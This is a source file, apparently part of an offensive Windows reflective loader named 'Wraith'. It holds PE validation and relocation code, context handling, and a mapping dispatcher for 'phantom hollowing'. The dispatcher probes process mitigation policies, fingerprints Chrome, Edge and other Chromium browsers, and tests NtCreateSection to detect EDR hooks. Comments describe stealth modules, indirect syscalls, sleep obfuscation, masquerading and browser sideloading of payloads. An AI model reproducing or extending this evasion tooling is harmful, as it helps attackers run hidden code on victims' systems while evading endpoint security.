  case WRAITH_E_RELOC_NOT_RELOCATABLE:  return "image not relocatable but base differs";
  case WRAITH_E_RELOC_BAD_TYPE:  return "unknown relocation type";

  /* IMPORTS */
  case WRAITH_E_IMP_DLL_NOT_FOUND:  return "imported DLL not found";
  case WRAITH_E_IMP_PROC_NOT_FOUND:  return "imported procedure not found";
  case WRAITH_E_IMP_FORWARDER_LOOP:  return "forwarder export loop detected";
  case WRAITH_E_IMP_DELAY_BAD_DESCR:  return "malformed delay-load descriptor";

  /* EXPORTS */
  case WRAITH_E_EXP_NOT_FOUND:  return "exported symbol not found";
  case WRAITH_E_EXP_BAD_ORDINAL:  return "ordinal out of range";
  case WRAITH_E_EXP_NO_TABLE:  return "image has no export table";

  /* TLS */
  case WRAITH_E_TLS_CALLBACK_FAILED:  return "TLS callback returned failure";

  /* SEH */
  case WRAITH_E_SEH_NO_PDATA:  return "image has no .pdata directory";
  case WRAITH_E_SEH_REGISTER_FAILED:  return "RtlAddFunctionTable failed";

  /* RUNTIME */
  case WRAITH_E_RT_PEB_WALK_FAILED:  return "PEB walk failed to find module";
  case WRAITH_E_RT_API_NOT_RESOLVED:  return "API resolution failed";
  case WRAITH_E_RT_DLLMAIN_FAILED:  return "DllMain returned FALSE";

  /* SYSCALL */
  case WRAITH_E_SC_SSN_NOT_RESOLVED:  return "syscall SSN could not be resolved";
  case WRAITH_E_SC_NO_GADGET:  return "no syscall gadget found in ntdll";
  case WRAITH_E_SC_INVOKE_FAILED:  return "indirect syscall invocation failed";

  /* STEALTH */
  case WRAITH_E_STEALTH_INSTALL:  return "stealth module installation failed";
  case WRAITH_E_STEALTH_INCOMPATIBLE:  return "stealth module not supported on this build";

  /* FEATURE */
  case WRAITH_E_FEATURE_DISABLED:  return "feature compiled out at build time";

  /* INTERNAL */
  case WRAITH_E_OOM:  return "out of memory";
  case WRAITH_E_UNEXPECTED:  return "unexpected internal error";

  default:  return "unknown status";
  }
}


/* ==========================================================================
 * src/core/wr_context.c
 * ========================================================================== */

/*
 * src/core/wr_context.c
 *
 * Allocation, validation, and teardown of the WRAITH_CONTEXT (wr_ctx).
 * The full pipeline lives elsewhere; this TU keeps lifecycle concerns
 * isolated.
 *
 * this provides skeletons + sanity-check entry points used by
 * (loader pipeline). All non-trivial fields are NULL until the
 * subsequent phases populate them.
 */


#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#endif

/* Per-thread last-error string. The header exposes wraith_last_error()
 * which returns this buffer for the calling thread. We prefer thread_local
 * for correctness; if the toolchain doesn't support it we fall back to a
 * single global (acceptable for single-threaded test harnesses). */
#if defined(__GNUC__) || defined(__clang__)
#  define WRAITH_TLS __thread
#elif defined(_MSC_VER)
#  define WRAITH_TLS __declspec(thread)
#else
#  define WRAITH_TLS
#endif

static WRAITH_TLS char g_thread_err[160];

const char *wraith_last_error(void)
{
  return g_thread_err;
}

const char *wraith_version(void)
{
#if defined(WRAITH_VERSION_STRING) && defined(WRAITH_PROFILE_NAME)
  return "Wraith " WRAITH_VERSION_STRING " (" WRAITH_PROFILE_NAME ")";
#elif defined(WRAITH_VERSION_STRING)
  return "Wraith " WRAITH_VERSION_STRING;
#else
  return "Wraith";
#endif
}

/* -------------------------------------------------------------------------
 * Construction / destruction
 * ------------------------------------------------------------------------- */

wraith_status_t wr_ctx_create(const wraith_load_options *opt, struct wr_ctx **out)
{
  if (!out) {
  return WRAITH_E_NULL_ARG;
  }
  *out = NULL;

  struct wr_ctx *ctx = (struct wr_ctx *)calloc(1, sizeof(struct wr_ctx));
  if (!ctx) {
  return WRAITH_E_OOM;
  }

  ctx->magic  = WRAITH_CTX_MAGIC;
  ctx->last_status  = WRAITH_OK;
  ctx->image_type  = WRAITH_IMAGE_UNKNOWN;
  ctx->page_size  = 4096;
  ctx->alloc_granularity = 65536;

#ifdef _WIN32
  SYSTEM_INFO si;
  GetNativeSystemInfo(&si);
  ctx->page_size  = (uint32_t)si.dwPageSize;
  ctx->alloc_granularity = (uint32_t)si.dwAllocationGranularity;
#endif

  if (opt) {
  ctx->flags  = opt->flags;
  ctx->map_strategy  = opt->map_strategy;
  ctx->sleep_algo  = opt->sleep_algo;
  ctx->masquerade_name = opt->masquerade;
  ctx->masquerade_path = opt->masquerade_path;
  ctx->user_alloc  = opt->alloc;
  ctx->user_free  = opt->freefn;
  ctx->user_loadlib  = opt->loadlib;
  ctx->user_getproc  = opt->getproc;
  ctx->user_freelib  = opt->freelib;
  ctx->user_data  = opt->userdata;
  ctx->trace  = opt->trace;
  ctx->trace_userdata = opt->trace_userdata;
  } else {
  /* Zero-initialized options == behavior. */
  ctx->map_strategy = WRAITH_MAP_PRIVATE_RW_RX;
  ctx->sleep_algo  = WRAITH_SLEEP_EKKO;
  }

  *out = ctx;
  return WRAITH_OK;
}

void wr_ctx_destroy(struct wr_ctx *ctx)
{
  if (!ctx) {
  return;
  }
  /* only the bare frame exists. Subsequent phases will free
  * tracked allocations, unwind RtlAddFunctionTable, etc. */
  ctx->magic = 0;
  free(ctx);
}

wraith_status_t wr_ctx_check(wraith_handle_t h, struct wr_ctx **out)
{
  if (out) {
  *out = NULL;
  }
  if (!h) {
  return WRAITH_E_NULL_ARG;
  }
  struct wr_ctx *ctx = (struct wr_ctx *)h;
  if (ctx->magic != WRAITH_CTX_MAGIC) {
  return WRAITH_E_INVALID_HANDLE;
  }
  if (out) {
  *out = ctx;
  }
  return WRAITH_OK;
}

wraith_status_t wr_ctx_fail(struct wr_ctx *ctx, wraith_status_t status, const char *fmt, ...)
{
  /* Update the per-thread context string regardless of whether `ctx`
  * is non-NULL - callers may fail before a context exists. */
  if (fmt) {
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(g_thread_err, sizeof(g_thread_err), fmt, ap);
  va_end(ap);
  } else {
  snprintf(g_thread_err, sizeof(g_thread_err), "unknown error");
  }

  if (ctx) {
  ctx->last_status = status;
  size_t n = strnlen(g_thread_err, sizeof(g_thread_err));
  if (n >= sizeof(ctx->err_context)) {
  n = sizeof(ctx->err_context) - 1;
  }
  memcpy(ctx->err_context, g_thread_err, n);
  ctx->err_context[n] = '\0';
  }
  return status;
}


/* ==========================================================================
 * src/pe/pe_validate.c
 * ========================================================================== */

/*
 * src/pe/pe_validate.c
 *
 * Bounds-checked PE validator. Every pointer dereference is gated by an
 * explicit size check; no integer arithmetic on offsets is performed
 * without an overflow guard. Designed to be fed arbitrary fuzz inputs.
 */

#include <stdint.h>
#include <string.h>

/* Returns 1 iff a + b would overflow uint32_t. */
static int u32_add_overflows(uint32_t a, uint32_t b)
{
  return b > (uint32_t)0xffffffffu - a;
}

/* Returns 1 iff a + b would exceed `limit`. */
static int range_exceeds(size_t a, size_t b, size_t limit)
{
  if (b > limit) {
  return 1;
  }
  return a > limit - b;
}

static int is_power_of_two(uint32_t v)
{
  return v != 0 && (v & (v - 1)) == 0;
}

wraith_status_t wr_pe_validate(const void *buffer, size_t buffer_size,
  wr_pe_view *out)
{
  if (!buffer || !out) {
  return WRAITH_E_NULL_ARG;
  }
  memset(out, 0, sizeof(*out));

  if (buffer_size < sizeof(wr_pe_dos_header)) {
  return WRAITH_E_PE_TRUNCATED;
  }

  const uint8_t *bytes = (const uint8_t *)buffer;
  const wr_pe_dos_header *dos = (const wr_pe_dos_header *)bytes;

  if (dos->e_magic != WRAITH_PE_DOS_SIGNATURE) {
  return WRAITH_E_PE_BAD_DOS_MAGIC;
  }

  /* e_lfanew is 32-bit unsigned. Reject negative-as-unsigned values that
  * would overflow when we add sizeof(NT headers). */
  uint32_t nt_off = (uint32_t)dos->e_lfanew;
  if (nt_off < sizeof(wr_pe_dos_header)) {
  /* NT headers must follow the DOS header */
  return WRAITH_E_PE_OVERFLOW;
  }
  if (range_exceeds(nt_off, sizeof(wr_pe_nt_headers64), buffer_size)) {
  return WRAITH_E_PE_TRUNCATED;
  }

  const wr_pe_nt_headers64 *nt =
  (const wr_pe_nt_headers64 *)(bytes + nt_off);
  if (nt->Signature != WRAITH_PE_NT_SIGNATURE) {
  return WRAITH_E_PE_BAD_NT_MAGIC;
  }

  if (nt->FileHeader.Machine != WRAITH_PE_MACHINE_AMD64) {
  return WRAITH_E_PE_WRONG_MACHINE;
  }
  if (nt->OptionalHeader.Magic != WRAITH_PE_OPT_MAGIC_PE32PLUS) {
  return WRAITH_E_PE_BAD_OPT_MAGIC;
  }

  /* Section/file alignment must be powers of two and SectionAlignment
  * must be >= FileAlignment per the PE spec. */
  if (!is_power_of_two(nt->OptionalHeader.SectionAlignment) ||
  !is_power_of_two(nt->OptionalHeader.FileAlignment) ||
  nt->OptionalHeader.SectionAlignment < nt->OptionalHeader.FileAlignment) {
  return WRAITH_E_PE_BAD_ALIGNMENT;
  }

  /* SizeOfOptionalHeader from the file header must match what we expect
  * (NumberOfRvaAndSizes affects this; check at least the prefix is
  * accounted for). */
  if (nt->FileHeader.SizeOfOptionalHeader < sizeof(wr_pe_optional_header64)
  - sizeof(wr_pe_data_directory)
  * WRAITH_PE_DIR_COUNT) {
  return WRAITH_E_PE_BAD_OPT_MAGIC;
  }

  /* Locate the section table - it lives immediately after the optional
  * header (plus FileHeader). */
  uint32_t sec_off = nt_off
  + (uint32_t)offsetof(wr_pe_nt_headers64, OptionalHeader)
  + nt->FileHeader.SizeOfOptionalHeader;

  uint16_t sec_count = nt->FileHeader.NumberOfSections;
  if (sec_count == 0) {
  return WRAITH_E_PE_BAD_SECTION;
  }

  /* sec_off + sec_count * sizeof(section_header) must fit. */
  size_t sec_table_bytes = (size_t)sec_count * sizeof(wr_pe_section_header);
  if (range_exceeds(sec_off, sec_table_bytes, buffer_size)) {
  return WRAITH_E_PE_TRUNCATED;
  }

  const wr_pe_section_header *sections =
  (const wr_pe_section_header *)(bytes + sec_off);

  /* Sanity-walk every section header. We don't verify raw data here -
  * that's the loader's job during section copy. */
  uint32_t last_section_end = 0;
  for (uint16_t i = 0; i < sec_count; ++i) {
  const wr_pe_section_header *s = &sections[i];

  /* SizeOfRawData + PointerToRawData must fit in buffer (when raw
  * data is present). Bounds-check against integer overflow. */
  if (s->SizeOfRawData > 0) {
  if (u32_add_overflows(s->PointerToRawData, s->SizeOfRawData)) {
  return WRAITH_E_PE_OVERFLOW;
  }
  uint32_t end = s->PointerToRawData + s->SizeOfRawData;
  if ((size_t)end > buffer_size) {
  return WRAITH_E_PE_TRUNCATED;
  }
  }

  /* VirtualAddress + max(VirtualSize, SizeOfRawData) bounded by
  * SizeOfImage. Use VirtualSize when nonzero, else SectionAlignment. */
  uint32_t vsize = s->VirtualSize;
  if (vsize == 0) {
  vsize = nt->OptionalHeader.SectionAlignment;
  }
  if (u32_add_overflows(s->VirtualAddress, vsize)) {
  return WRAITH_E_PE_OVERFLOW;
  }
  uint32_t vend = s->VirtualAddress + vsize;
  if (vend > last_section_end) {
  last_section_end = vend;
  }
  }

  if (last_section_end > nt->OptionalHeader.SizeOfImage) {
  /* Sections extend past SizeOfImage - reject. */
  return WRAITH_E_PE_SIZE_MISMATCH;
  }

  /* SizeOfHeaders must encompass the headers we just walked. */
  if (nt->OptionalHeader.SizeOfHeaders > buffer_size) {
  return WRAITH_E_PE_TRUNCATED;
  }
  if (nt->OptionalHeader.SizeOfHeaders < sec_off + sec_table_bytes) {
  return WRAITH_E_PE_SIZE_MISMATCH;
  }

  out->buffer  = bytes;
  out->buffer_size  = buffer_size;
  out->dos  = dos;
  out->nt  = nt;
  out->sections  = sections;
  out->section_count = sec_count;
  out->is_dll  = (nt->FileHeader.Characteristics & WRAITH_PE_FILE_DLL) != 0;
  out->is_executable = (nt->FileHeader.Characteristics & WRAITH_PE_FILE_EXECUTABLE) != 0;
  return WRAITH_OK;
}

wraith_status_t wr_pe_get_data_directory(const wr_pe_view *view,
  unsigned index,
  uint32_t *out_rva,
  uint32_t *out_size)
{
  if (!view || !view->nt || !out_rva || !out_size) {
  return WRAITH_E_NULL_ARG;
  }
  if (index >= WRAITH_PE_DIR_COUNT) {
  return WRAITH_E_NULL_ARG;
  }
  if (index >= view->nt->OptionalHeader.NumberOfRvaAndSizes) {
  *out_rva  = 0;
  *out_size = 0;
  return WRAITH_OK;
  }
  *out_rva  = view->nt->OptionalHeader.DataDirectory[index].VirtualAddress;
  *out_size = view->nt->OptionalHeader.DataDirectory[index].Size;
  return WRAITH_OK;
}


/* ==========================================================================
 * src/pe/pe_iter.c
 * ========================================================================== */

/*
 * src/pe/pe_iter.c
 *
 * Implementation of section + base-relocation iterators. Both are zero-
 * allocation and bounds-checked at every step.
 */

#include <stdint.h>

void wr_pe_section_iter_init(wr_pe_section_iter *it, const wr_pe_view *view)
{
  if (!it) {
  return;
  }
  it->view  = view;
  it->index = 0;
}

const wr_pe_section_header *wr_pe_section_iter_next(wr_pe_section_iter *it)
{
  if (!it || !it->view) {
  return NULL;
  }
  if (it->index >= it->view->section_count) {
  return NULL;
  }
  return &it->view->sections[it->index++];
}

wraith_status_t wr_pe_reloc_iter_init(wr_pe_reloc_iter *it, const wr_pe_view *view)
{
  if (!it || !view) {
  return WRAITH_E_NULL_ARG;
  }

  it->view  = view;
  it->current = NULL;
  it->end  = NULL;

  uint32_t reloc_rva  = 0;
  uint32_t reloc_size = 0;
  wraith_status_t rc = wr_pe_get_data_directory(view, WRAITH_PE_DIR_BASERELOC,
  &reloc_rva, &reloc_size);
  if (rc != WRAITH_OK) {
  return rc;
  }
  if (reloc_size == 0) {
  /* No relocs - leave current/end NULL so iter_next returns NULL. */
  return WRAITH_OK;
  }

  /* The reloc data is referenced by RVA, but during validation we still
  * have the file (raw) layout. We need to find the raw offset that the
  * RVA maps to via the section table. */
  const uint8_t *raw = NULL;
  for (uint16_t i = 0; i < view->section_count; ++i) {
  const wr_pe_section_header *s = &view->sections[i];
  uint32_t vsize = s->VirtualSize ? s->VirtualSize
  : view->nt->OptionalHeader.SectionAlignment;
  if (reloc_rva >= s->VirtualAddress && reloc_rva < s->VirtualAddress + vsize) {
  uint32_t delta = reloc_rva - s->VirtualAddress;
  if (delta + reloc_size > s->SizeOfRawData) {
  return WRAITH_E_PE_TRUNCATED;
  }
  raw = view->buffer + s->PointerToRawData + delta;
  break;
  }
  }

  if (!raw) {
  /* Some images store reloc directly in headers (rare). Fall back
  * to interpreting the RVA as a buffer offset. */
  if ((size_t)reloc_rva + reloc_size > view->buffer_size) {
  return WRAITH_E_PE_TRUNCATED;
  }
  raw = view->buffer + reloc_rva;
  }

  it->current = (const wr_pe_base_relocation *)raw;
  it->end  = (const wr_pe_base_relocation *)(raw + reloc_size);
  return WRAITH_OK;
}

const wr_pe_base_relocation *wr_pe_reloc_iter_next(wr_pe_reloc_iter *it)
{
  if (!it || !it->current || it->current >= it->end) {
  return NULL;
  }
  const wr_pe_base_relocation *block = it->current;

  /* Sanity: a block with SizeOfBlock < header size is corrupt; bail
  * to NULL to terminate iteration. */
  if (block->SizeOfBlock < 8 || block->VirtualAddress == 0) {
  it->current = it->end;
  return NULL;
  }
  /* Advance. Block sizes are in bytes; bounds-check before stepping. */
  const uint8_t *next = (const uint8_t *)block + block->SizeOfBlock;
  if (next > (const uint8_t *)it->end) {
  it->current = it->end;
  } else {
  it->current = (const wr_pe_base_relocation *)next;
  }
  return block;
}


/* ==========================================================================
 * src/pe/pe_image_metrics.c
 * ========================================================================== */

#define align_up _wr_amalg_align_up__pe_image_metrics
/*
 * src/pe/pe_image_metrics.c
 *
 * Computes the image-level metrics derived from a validated PE view.
 * Pure - no allocation, no syscalls.
 */

#include <string.h>

static size_t align_up(size_t v, size_t alignment)
{
  if (alignment == 0) {
  return v;
  }
  return (v + alignment - 1) & ~(alignment - 1);
}

wraith_status_t wr_pe_compute_metrics(const wr_pe_view *view,
  uint32_t page_size,
  wr_pe_image_metrics *out)
{
  if (!view || !out || page_size == 0) {
  return WRAITH_E_NULL_ARG;
  }
  memset(out, 0, sizeof(*out));

  out->section_alignment = view->nt->OptionalHeader.SectionAlignment;
  out->file_alignment  = view->nt->OptionalHeader.FileAlignment;
  out->preferred_base  = view->nt->OptionalHeader.ImageBase;
  out->headers_size  = view->nt->OptionalHeader.SizeOfHeaders;

  /* Walk sections to find the highest VA in use. The validator already
  * checked that all sections fit within SizeOfImage. */
  size_t last_end = 0;
  for (uint16_t i = 0; i < view->section_count; ++i) {
  const wr_pe_section_header *s = &view->sections[i];
  uint32_t vsize = s->VirtualSize ? s->VirtualSize
  : view->nt->OptionalHeader.SectionAlignment;
  size_t end = (size_t)s->VirtualAddress + (size_t)vsize;
  if (end > last_end) {
  last_end = end;
  }
  }

  out->last_section_end  = align_up(last_end, page_size);
  out->aligned_image_size  = align_up(view->nt->OptionalHeader.SizeOfImage, page_size);

  if (out->aligned_image_size != align_up(out->last_section_end, page_size)) {
  /* If aligned image size disagrees with the last section end, the
  * headers are bogus and the loader cannot reserve memory safely. */
  return WRAITH_E_PE_SIZE_MISMATCH;
  }

  uint32_t reloc_rva = 0, reloc_size = 0;
  (void)wr_pe_get_data_directory(view, WRAITH_PE_DIR_BASERELOC,
  &reloc_rva, &reloc_size);
  out->has_relocations = (reloc_size > 0);

  return WRAITH_OK;
}

#undef align_up


/* ==========================================================================
 * src/mapping/map_dispatch.c
 * ========================================================================== */

/*
 * src/mapping/map_dispatch.c
 *
 * Strategy selection and shared helpers. Keeping this in one place means
 * the loader pipeline doesn't carry #ifdefs over which strategies are
 * compiled in.
 */


#include <stdatomic.h>
#include <windows.h>
#include <winternl.h>

#if WRAITH_USE_PHANTOM_HOLLOWING
/* Process-wide cache of "is mapping a foreign image as SEC_IMAGE going
 * to fail in this process?" The detection runs in four layers, each
 * cheaper than the last and catching a different failure mode:
 *
 *   Layer 1 (policy probe): cheap, no syscalls. Reads the documented
 *   process mitigation policies that flatly veto SEC_IMAGE / dynamic
 *   code:
 *       - ProcessSignaturePolicy.MicrosoftSignedOnly
 *       - ProcessDynamicCodePolicy.ProhibitDynamicCode
 *
 *   Layer 2 (strict-environment probe): also cheap. Detects hardened
 *   sandboxes by checking ProcessExtensionPointDisablePolicy and
 *   ProcessImageLoadPolicy flags - any of these set strongly correlate
 *   with "MEM_IMAGE pages get rechecked at first execute and FailFast
 *   the process".
 *
 *   Layer 3 (Chromium fingerprint): cheap, no syscalls. Looks for
 *   chrome.exe / msedge.exe / brave.exe and friends, plus chrome*.dll
 *   modules in the loaded list. The browser process of every
 *   Chromium-based browser sets a bespoke kernel-side code integrity
 *   policy that's not exposed through GetProcessMitigationPolicy on
 *   all Windows versions - it kills phantom hollowing at first execute
 *   even when Layers 1, 2 and 4 all report "clean". Belt-and-braces
 *   for the canonical Chrome sideload scenario.
 *
 *   Layer 4 (active probe): only runs when Layers 1-3 are clean. We
 *   actually try to NtCreateSection(SEC_IMAGE) on a small System32
 *   DLL (version.dll) and immediately discard the section. This catches
 *   EDR hooks that synthesize a failure on foreign SEC_IMAGE creation,
 *   uncommon mitigations, etc.
 *
 * If any layer reports "blocked", wr_map_resolve silently downgrades
 * a PHANTOM_HOLLOW request to PRIVATE_RW_RX so the load still succeeds
 * with the strongest stealth this environment allows.
 *
 * Three states encoded as an atomic int:
 *   0 = uninitialized
 *   1 = probed, blocking detected
 *   2 = probed, no block
 */
static atomic_int g_phantom_blocked = 0;

#ifndef SEC_IMAGE
#  define SEC_IMAGE 0x01000000
#endif
#ifndef SECTION_ALL_ACCESS
#  define SECTION_ALL_ACCESS 0xF001F
#endif

static int probe_phantom_policy(void)
{
  typedef BOOL (WINAPI *fn_GetProcMit)(HANDLE, PROCESS_MITIGATION_POLICY,
                                       PVOID, SIZE_T);
  HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
  if (!k32) {
  return 0;
  }
  fn_GetProcMit get = (fn_GetProcMit)(void *)GetProcAddress(
      k32, "GetProcessMitigationPolicy");
  if (!get) {
  return 0;  /* old Windows: no mitigation policies, no block */
  }

  PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sig;
  ZeroMemory(&sig, sizeof(sig));
  if (get(GetCurrentProcess(), ProcessSignaturePolicy,
          &sig, sizeof(sig))
      && sig.MicrosoftSignedOnly) {
  return 1;
  }

  PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dyn;
  ZeroMemory(&dyn, sizeof(dyn));
  if (get(GetCurrentProcess(), ProcessDynamicCodePolicy,
          &dyn, sizeof(dyn))
      && dyn.ProhibitDynamicCode) {
  return 1;
  }

  return 0;
}

/* Strict-sandbox heuristic: detect process mitigations that
 * Chrome / Edge / Brave browser-process always set, and that strongly
 * correlate with "execution from a SEC_IMAGE region overlaid with
 * unsigned payload code is killed by the kernel/EDR mid-flight even
 * though NtCreateSection itself succeeded".
 *
 * The two failure modes we've observed:
 *   - the OS performs a code-integrity recheck on first execution of
 *     a page in a MEM_IMAGE region, notices the in-memory bytes don't
 *     match the on-disk backing PE, and FailFasts the process.
 *   - an EDR's user-mode kernel32/ntdll hook on memory protection
 *     changes is more aggressive on MEM_IMAGE pages than on
 *     MEM_PRIVATE pages.
 *
 * Either way, by the time the payload's DllMain runs the process is
 * already dead and SEH never gets to catch anything. The pre-flight
 * active probe (NtCreateSection + immediate close) doesn't trigger
 * these because no code ever executes from the probe section.
 *
 * The reliable proxy: Chrome browser process always sets
 *   ProcessExtensionPointDisablePolicy.DisableExtensionPoints
 * AND one of the hardening flags in
 *   ProcessImageLoadPolicy.{NoRemoteImages, NoLowMandatoryLabelImages,
 *                           PreferSystem32Images}
 * Both are visible via GetProcessMitigationPolicy without any active
 * probe. Either flag alone is enough of a signal that we're in a
 * hardened sandbox where phantom hollowing will be killed at execute. */
static int probe_phantom_strict_environment(void)
{
  typedef BOOL (WINAPI *fn_GetProcMit)(HANDLE, PROCESS_MITIGATION_POLICY,
                                       PVOID, SIZE_T);
  HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
  if (!k32) {
  return 0;
  }
  fn_GetProcMit get = (fn_GetProcMit)(void *)GetProcAddress(
      k32, "GetProcessMitigationPolicy");
  if (!get) {
  return 0;
  }

  /* ProcessExtensionPointDisablePolicy. The single most reliable
  * Chrome-browser fingerprint: legacy AppInit_DLLs / IME / hooks
  * blocked. Chrome Renderer, GPU, Utility processes also set it. */
  PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ext;
  ZeroMemory(&ext, sizeof(ext));
  if (get(GetCurrentProcess(), ProcessExtensionPointDisablePolicy,
          &ext, sizeof(ext))
      && ext.DisableExtensionPoints) {
  return 1;
  }

  /* ProcessImageLoadPolicy. Chrome browser sets NoRemoteImages and
  * NoLowMandatoryLabelImages; some configs also set PreferSystem32Images.
  * Any of these implies the image-load path is locked down and our
  * SEC_IMAGE overlay is being scrutinized post-creation. */
  PROCESS_MITIGATION_IMAGE_LOAD_POLICY iml;
  ZeroMemory(&iml, sizeof(iml));
  if (get(GetCurrentProcess(), ProcessImageLoadPolicy,
          &iml, sizeof(iml))
      && (iml.NoRemoteImages
          || iml.NoLowMandatoryLabelImages
          || iml.PreferSystem32Images)) {
  return 1;
  }

  return 0;
}

/* Chromium fingerprint: detect Chrome / Edge / Brave / Opera / Vivaldi
 * etc. by either a known browser DLL being loaded in the current
 * process, or the executable basename matching one of the known
 * Chromium-derivative browsers.
 *
 * Why this layer exists: Chrome browser process passes Layers 1, 2 and
 * 4 of our probe chain clean, yet phantom hollowing still triggers a
 * crash inside the payload's DllMain - no SEH, no NTSTATUS, just a
 * silent FailFast. The kernel does an integrity recheck on the first
 * execute of any page in a MEM_IMAGE region whose backing PE doesn't
 * match what's now in memory, and the only reliable way to know we're
 * in that environment up-front is to recognize the browser by name.
 *
 * Module check is cheaper and more robust (works even if the
 * executable was renamed); name check catches statically linked
 * launchers and unusual deployments. Either signal is enough. */
static int probe_phantom_chromium(void)
{
  static const wchar_t *const kChromiumModules[] = {
  L"chrome.dll",  /* Chrome / Chromium / many Chromium forks */
  L"chrome_elf.dll",  /* Chrome's early loader */
  L"chrome_child.dll", /* legacy Chrome renderer/utility */
  L"msedge.dll",  /* Microsoft Edge browser process */
  L"msedge_elf.dll", /* Microsoft Edge ELF */
  L"brave.dll",  /* Brave */
  L"opera.dll",  /* Opera */
  L"vivaldi.dll",  /* Vivaldi */
  };
  for (size_t i = 0; i < sizeof(kChromiumModules) / sizeof(kChromiumModules[0]); ++i) {
  if (GetModuleHandleW(kChromiumModules[i])) {
  return 1;
  }
  }

  wchar_t exe[MAX_PATH];
  DWORD n = GetModuleFileNameW(NULL, exe, MAX_PATH);
  if (n == 0 || n >= MAX_PATH) {
  return 0;
  }
  /* Find basename. */
  wchar_t *base = exe;
  for (DWORD i = 0; i < n; ++i) {
  if (exe[i] == L'\\' || exe[i] == L'/') {
  base = &exe[i + 1];
  }
  }
  /* Lowercase the basename in place into a scratch buffer so the
  * comparisons below are case-insensitive without depending on
  * lstrcmpiW / CompareStringEx loader shape. */
  wchar_t lower[64];
  size_t li = 0;
  while (base[li] && li + 1 < (sizeof(lower) / sizeof(lower[0]))) {
  wchar_t c = base[li];
  if (c >= L'A' && c <= L'Z') {
  c = (wchar_t)(c - L'A' + L'a');
  }
  lower[li] = c;
  ++li;
  }
  lower[li] = L'\0';

  static const wchar_t *const kChromiumExes[] = {
  L"chrome.exe",
  L"chromium.exe",
  L"msedge.exe",
  L"msedgewebview2.exe",
  L"brave.exe",
  L"opera.exe",
  L"opera_gx.exe",
  L"vivaldi.exe",
  L"yandex.exe",
  L"thorium.exe",
  L"ungoogled-chromium.exe",
  };
  for (size_t i = 0; i < sizeof(kChromiumExes) / sizeof(kChromiumExes[0]); ++i) {
  /* Hand-rolled wcscmp to avoid pulling crt deps in static-link
  * configurations - the strings are short and ASCII. */
  const wchar_t *a = lower;
  const wchar_t *b = kChromiumExes[i];
  while (*a && *a == *b) { ++a; ++b; }
  if (*a == L'\0' && *b == L'\0') {
  return 1;
  }
  }

  return 0;
}

/* Active probe: try the same NtCreateSection(SEC_IMAGE) the phantom
 * strategy will issue, on a tiny System32 DLL we know exists on every
 * Windows host. If the call returns any non-success NTSTATUS we treat
 * phantom as broken in this process - this catches mitigations not
 * exposed via GetProcessMitigationPolicy and EDR hooks that synthesize
 * a failure for foreign SEC_IMAGE creation.
 *
 * The probe uses the direct ntdll exports rather than the indirect
 * syscall engine: the engine may not be initialized yet at this point
 * in the pipeline, and an EDR hook on NtCreateSection that vetoes the
 * call is exactly what we want to detect anyway. */
static int probe_phantom_active(void)
{
  typedef NTSTATUS (NTAPI *fn_NtCreateSection)(
      PHANDLE, ACCESS_MASK, void *, PLARGE_INTEGER,
      ULONG, ULONG, HANDLE);
  typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);

  HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
  if (!ntdll) {
  return 0;  /* without ntdll we can't do anything; assume not blocked */
  }
  fn_NtCreateSection p_NtCreateSection = (fn_NtCreateSection)(void *)
      GetProcAddress(ntdll, "NtCreateSection");
  fn_NtClose p_NtClose = (fn_NtClose)(void *)
      GetProcAddress(ntdll, "NtClose");
  if (!p_NtCreateSection || !p_NtClose) {
  return 0;
  }

  /* Build %SystemRoot%\System32\version.dll - small (~30 KiB), present
   * on every Windows install since Win2000. */
  wchar_t path[MAX_PATH];
  UINT n = GetSystemDirectoryW(path, MAX_PATH);
  if (n == 0 || n + 13 >= MAX_PATH) {
  return 0;
  }
  if (path[n - 1] != L'\\') {
  path[n++] = L'\\';
  }
  static const wchar_t kProbeDll[] = L"version.dll";
  for (size_t i = 0; i < sizeof(kProbeDll) / sizeof(kProbeDll[0]); ++i) {
  path[n + i] = kProbeDll[i];
  }

  HANDLE hf = CreateFileW(path, GENERIC_READ | GENERIC_EXECUTE,
                          FILE_SHARE_READ, NULL, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, NULL);
  if (hf == INVALID_HANDLE_VALUE) {
  return 0;  /* file inaccessible - that's a different problem */
  }

  /* Try the same NtCreateSection invocation phantom uses, walking the
   * canonical retry chain for SectionPageProtection. STATUS_INVALID_
   * PAGE_PROTECTION (0xC00000F4) means "wrong protection for this kernel
   * variant", retry. Any other non-zero NTSTATUS means a real veto
   * (signing, dynamic-code, EDR refusal). Status 0 means SEC_IMAGE works
   * here. */
  static const ULONG kProtAttempts[] = {
  PAGE_READONLY,
  PAGE_EXECUTE,
  PAGE_EXECUTE_READ,
  PAGE_EXECUTE_WRITECOPY,
  };
  HANDLE sec = NULL;
  NTSTATUS s = (NTSTATUS)0xC00000F4;
  for (size_t pi = 0; pi < sizeof(kProtAttempts) / sizeof(kProtAttempts[0]); ++pi) {
  s = p_NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, NULL,
                        kProtAttempts[pi], SEC_IMAGE, hf);
  if (s == 0) {
  break;
  }
  if ((unsigned)s != 0xC00000F4u) {
  break;
  }
  }
  CloseHandle(hf);
  if (s == 0 && sec) {
  p_NtClose(sec);
  return 0;  /* phantom works in this process */
  }
  return 1;  /* SEC_IMAGE refused - phantom is broken here */
}

static int phantom_is_blocked(void)
{
  int s = atomic_load(&g_phantom_blocked);
  if (s != 0) {
  return s == 1;
  }
  int blocked = probe_phantom_policy();
  if (!blocked) {
  blocked = probe_phantom_strict_environment();
  }
  if (!blocked) {
  blocked = probe_phantom_chromium();
  }
  if (!blocked) {
  blocked = probe_phantom_active();
  }
  atomic_store(&g_phantom_blocked, blocked ? 1 : 2);
  return blocked;
}

/* Public entrypoint for other TUs (loader_pipeline) to mark phantom as
 * unusable after a runtime failure - the next wr_map_resolve call will
 * pick private_rwx without re-probing. */
void wr_phantom_mark_blocked(void);
void wr_phantom_mark_blocked(void)
{
  atomic_store(&g_phantom_blocked, 1);
}
#endif  /* WRAITH_USE_PHANTOM_HOLLOWING */
